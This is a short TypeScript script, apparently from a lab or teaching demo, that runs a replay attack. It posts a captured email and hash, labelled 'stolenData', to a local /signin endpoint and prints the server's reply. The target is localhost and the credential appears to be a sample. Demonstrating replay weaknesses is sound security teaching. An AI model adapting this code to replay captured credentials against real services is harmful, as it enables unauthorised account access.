import axios, { AxiosError } from "axios";

const BASE_URL = "http://localhost:3000";

async function replayAttack(stolenData: {
  email: string;
  data: string;
}): Promise<void> {
  try {
    const resp = await axios.post(`${BASE_URL}/signin`, { ...stolenData });
    const { msg } = resp.data;
    console.log(msg);
  } catch (error) {
    if (error instanceof AxiosError) {
      const { msg } = error.response?.data;
      console.log(error.response?.status, "Error: ", msg);
    }
  }
}

const stolenData = {
  email: "eason@music.com",
  data: "be9b757c9e8ecf133afc2e924f352be55ce09ddaf367c22f5684f7335f332f29",
};

replayAttack(stolenData);
